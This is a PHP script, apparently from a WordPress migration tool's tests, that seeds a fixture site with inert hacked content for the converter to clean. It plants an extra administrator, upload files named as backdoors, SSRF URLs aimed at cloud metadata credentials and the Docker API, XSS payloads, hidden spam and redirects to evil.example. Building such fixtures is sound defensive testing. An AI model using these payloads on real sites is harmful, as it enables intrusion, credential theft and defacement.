<?php
/**
 * Seeds the hacked-site fixture (doc 12.14) with the threats in doc 12.3. Run by
 * scripts/fixture-hacked-seed.mjs through `wp eval-file`. Idempotent: everything it made before is
 * deleted first. Every sample is inert: alert() calls, evil.example hosts, a PHP file that echoes.
 */

// Store the content exactly as an attacker with database access would leave it.
kses_remove_filters();

$marker = '_wp2p_hacked';

foreach (get_posts(['post_type' => ['post', 'page', 'attachment'], 'post_status' => 'any', 'numberposts' => -1, 'meta_key' => $marker]) as $old) {
    wp_delete_post($old->ID, true);
}
foreach (['hacked-author', 'wp-sys-maint'] as $login) {
    $u = get_user_by('login', $login);
    if ($u) {
        require_once ABSPATH . 'wp-admin/includes/user.php';
        wp_delete_user($u->ID);
    }
}

// T8: an attacker-made administrator with no posts, and an author whose display name carries markup.
wp_insert_user(['user_login' => 'wp-sys-maint', 'user_pass' => wp_generate_password(32), 'user_email' => 'maint@example.invalid', 'role' => 'administrator', 'display_name' => 'System Maintenance']);
$author = wp_insert_user(['user_login' => 'hacked-author', 'user_pass' => wp_generate_password(32), 'user_email' => 'author@example.invalid', 'role' => 'author', 'display_name' => 'Jane <script>alert("author")</script>Doe', 'user_nicename' => 'hacked-author']);
if (is_wp_error($author)) {
    WP_CLI::error($author->get_error_message());
}

// Media: copy a file into uploads and register it, optionally with a forced source URL (T9).
function wp2p_attach(string $file, string $mime, string $title, array $opts = []): int {
    $uploads = wp_upload_dir('2026/10');
    $dest = $uploads['path'] . '/' . $file;
    if (!is_dir($uploads['path'])) {
        wp_mkdir_p($uploads['path']);
    }
    copy('/seed/media/' . ($opts['from'] ?? $file), $dest);
    $id = wp_insert_attachment([
        'post_title' => $title,
        'post_mime_type' => $mime,
        'post_status' => 'inherit',
        'post_excerpt' => $opts['caption'] ?? '',
        'guid' => $uploads['url'] . '/' . $file,
    ], $dest);
    update_post_meta($id, '_wp2p_hacked', '1');
    if (isset($opts['alt'])) {
        update_post_meta($id, '_wp_attachment_image_alt', $opts['alt']);
    }
    if (isset($opts['url'])) {
        update_post_meta($id, '_wp2p_url', $opts['url']);
    }
    return $id;
}

$media = [
    // Clean, with markup in the short fields (T2).
    'clean' => wp2p_attach('ok.jpg', 'image/jpeg', 'Clean <img src=x onerror=alert("title")>', ['alt' => 'Alt <img src=x onerror=alert("alt")>', 'caption' => 'Caption <script>alert("caption")</script>']),
    // T6: backdoors in uploads.
    'double-ext' => wp2p_attach('logo.jpg.php', 'image/jpeg', 'Logo'),
    'phtml' => wp2p_attach('shell.phtml', 'image/jpeg', 'Shell'),
    'polyglot' => wp2p_attach('polyglot.jpg', 'image/jpeg', 'Polyglot'),
    'fake-png' => wp2p_attach('fake.png', 'image/png', 'Fake PNG'),
    'pdf-js' => wp2p_attach('js.pdf', 'application/pdf', 'PDF with JavaScript'),
    // T7.
    'svg' => wp2p_attach('scripted.svg', 'image/svg+xml', 'Scripted SVG'),
    // T9: cloud metadata, an internal address that is not the source host, and the source host on another port.
    'ssrf-metadata' => wp2p_attach('ssrf-metadata.jpg', 'image/jpeg', 'Metadata', ['from' => 'ok.jpg', 'url' => 'http://169.254.169.254/latest/meta-data/iam/security-credentials/']),
    'ssrf-internal' => wp2p_attach('ssrf-internal.jpg', 'image/jpeg', 'Internal', ['from' => 'ok.jpg', 'url' => 'https://127.0.0.2/wp-content/uploads/ok.jpg']),
    'ssrf-port' => wp2p_attach('ssrf-port.jpg', 'image/jpeg', 'Other port', ['from' => 'ok.jpg', 'url' => 'http://localhost:2375/containers/json']),
];

$spam = '';
for ($i = 1; $i <= 30; $i++) {
    $spam .= "<a href=\"https://casino-$i.example/\">cheap viagra casino $i</a> ";
}

$posts = [
    // T1: script injection in content.
    'hacked-scripts' => [
        'post_title' => 'Scripts',
        'post_content' => <<<HTML
<!-- wp:paragraph --><p>Before the scripts.</p><!-- /wp:paragraph -->
<script>alert("script")</script>
<script src="https://evil.example/miner.js"></script>
<!-- wp:paragraph --><p><img src="http://localhost:8091/wp-content/uploads/2026/10/ok.jpg" onerror="alert('onerror')" alt="handler"></p><!-- /wp:paragraph -->
<!-- wp:paragraph --><p><a href="javascript:alert('js')">js link</a> <a href="&#106;ava&#x73;cript:alert('entity')">entity link</a> <a href=" java	script:alert('ws')">ws link</a> <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+">data link</a> <a href="vbscript:msgbox('vb')">vb link</a></p><!-- /wp:paragraph -->
<svg><style><img src=x onerror=alert('mxss')></style></svg>
<noscript><p title="</noscript><img src=x onerror=alert('noscript')>"></noscript>
<!-- wp:paragraph --><p>After the scripts.</p><!-- /wp:paragraph -->
HTML,
    ],
    // T3: pharma hack.
    'hacked-spam' => [
        'post_title' => 'Spam',
        'post_content' => <<<HTML
<!-- wp:paragraph --><p>A normal paragraph about gardening.</p><!-- /wp:paragraph -->
<div style="display:none">$spam</div>
<div style="position:absolute;left:-9999px"><a href="https://pills.example/">buy cheap pills online</a></div>
<p style="font-size:0"><a href="https://loans.example/">payday loans</a></p>
HTML,
    ],
    // T4: malicious redirects.
    'hacked-redirects' => [
        'post_title' => 'Redirects',
        'post_content' => <<<HTML
<meta http-equiv="refresh" content="0;url=https://evil.example/landing">
<script>window.location = "https://evil.example/landing"</script>
<!-- wp:paragraph --><p onmouseover="location.href='https://evil.example/hover'">Hover text.</p><!-- /wp:paragraph -->
HTML,
    ],
    // T5: rogue iframes next to an allowed embed.
    'hacked-iframes' => [
        'post_title' => 'Iframes',
        'post_content' => <<<HTML
<iframe src="https://evil.example/exploit-kit" width="1" height="1"></iframe>
<!-- wp:html --><iframe src="https://www.youtube.com.evil.example/embed/x"></iframe><!-- /wp:html -->
<!-- wp:embed {"url":"https://www.youtube.com/watch?v=dQw4w9WgXcQ","type":"video","providerNameSlug":"youtube"} -->
<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube"><div class="wp-block-embed__wrapper">
https://www.youtube.com/watch?v=dQw4w9WgXcQ
</div></figure>
<!-- /wp:embed -->
HTML,
    ],
    // T2: markup in the title and excerpt; the featured image is a scripted SVG (T7).
    'hacked-short-fields' => [
        'post_title' => 'Breaking <script>alert("title")</script>news <img src=x onerror=alert("title-img")>',
        'post_excerpt' => '<b onclick="alert(\'excerpt\')">Excerpt</b><script>alert("excerpt-script")</script>',
        'post_content' => '<!-- wp:paragraph --><p>Body.</p><!-- /wp:paragraph -->',
        'featured' => 'svg',
    ],
    // The featured image is the PHP-in-JPEG polyglot: it must arrive re-encoded, without the PHP.
    'hacked-media-links' => [
        'post_title' => 'Media',
        'post_content' => '<!-- wp:paragraph --><p>Gallery.</p><!-- /wp:paragraph -->',
        'featured' => 'polyglot',
    ],
];

foreach ($posts as $slug => $p) {
    $id = wp_insert_post([
        'post_type' => 'post',
        'post_status' => 'publish',
        'post_name' => $slug,
        'post_author' => $author,
        'post_title' => $p['post_title'],
        'post_excerpt' => $p['post_excerpt'] ?? '',
        'post_content' => $p['post_content'],
        'post_date' => '2026-10-01 10:00:00',
    ], true);
    if (is_wp_error($id)) {
        WP_CLI::error($id->get_error_message());
    }
    update_post_meta($id, $marker, '1');
    if (isset($p['featured'])) {
        set_post_thumbnail($id, $media[$p['featured']]);
    }
}

// A page with a Custom HTML block: the block editor's own way of storing raw markup.
$page = wp_insert_post([
    'post_type' => 'page',
    'post_status' => 'publish',
    'post_name' => 'hacked-page',
    'post_author' => $author,
    'post_title' => 'About',
    'post_content' => <<<HTML
<!-- wp:paragraph --><p>About us.</p><!-- /wp:paragraph -->
<!-- wp:html --><script>document.write('<a href="https://evil.example/">x</a>')</script><div style="visibility:hidden"><a href="https://casino.example/">casino bonus</a></div><!-- /wp:html -->
HTML,
], true);
update_post_meta($page, $marker, '1');

WP_CLI::success('hacked-site fixture seeded: ' . count($posts) . ' posts, 1 page, ' . count($media) . ' attachments');
